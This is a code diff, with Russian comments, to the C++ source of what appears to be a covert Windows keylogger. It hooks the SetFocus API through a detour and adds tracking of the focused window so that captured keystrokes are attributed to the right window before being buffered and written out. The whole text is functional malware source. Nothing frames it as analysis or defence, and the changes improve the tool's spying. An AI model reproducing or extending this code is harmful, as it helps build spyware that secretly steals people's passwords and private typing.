@@ -164,8 +164,11 @@ namespace KeyLogger
 	// Функция возвращает истину если система содержит только диалоги
 	bool IsDialogsSystem();
 
-	// Собфтие после обработки собщения
+	// Событие после обработки собщения
 	void DoAfterDispatchMessage(PMSG Msg, bool IsUnicode);
+
+	// Функция запоминает окно фокуса
+    void UpdateFocusWnd(HWND Wnd);
 
 	// Обработка отображения окон
 	void DoShowWindow(PShowWindowData Data);
@@ -250,7 +253,7 @@ namespace KeyLoggerHooks
 	HWND WINAPI Hook_SetFocus(HWND Wnd)
 	{
     	// Обрабатываем установку фокуса
-		KLG.FocusWnd = Wnd;
+		KeyLogger::UpdateFocusWnd(Wnd);
 		return Real_SetFocus(Wnd);
 	} 
 
@@ -604,6 +607,18 @@ void KeyLogger::DoAfterDispatchMessage(PMSG Msg, bool IsUnicode)
 	if (KLG.System != NULL && KLG.System->OnAfterDispatchMessage != NULL)
 		KLG.System->OnAfterDispatchMessage(KLG.System, Msg, IsUnicode);
 }
+//---------------------------------------------------------------------------
+
+// Функция запоминает окно фокуса
+void KeyLogger::UpdateFocusWnd(HWND Wnd)
+{
+	if (KLG.FocusWnd != Wnd)
+	{
+		KLG.FocusWnd = Wnd;
+		KeyLogger::CallEvent(KLE_FOCUS_CHANGED, &KLG.FocusWnd);
+    }
+}
+
 
 //---------------------------------------------------------------------------
 
@@ -1893,12 +1908,19 @@ bool KeyLogger::SetActiveWnd(HWND Wnd, DWORD Action)
 	if (Logger == NULL)
 		return false;
 
-	if  (Action == LOG_KEYBOARD && Logger->ActiveWND == Wnd)
-    	return true;
+	if  (Action == LOG_KEYBOARD)
+	{
+		if (Wnd && Wnd != KLG.FocusWnd)
+			UpdateFocusWnd((HWND)pGetFocus());
+
+
+		if (Logger->ActiveWND == Wnd)
+			return true;
+    }
 
 	if (Logger->ActiveWND != NULL)
 	{
-    	WriteBuffer();
+		WriteBuffer();
     	Logger->ActiveWND = NULL;
 
 
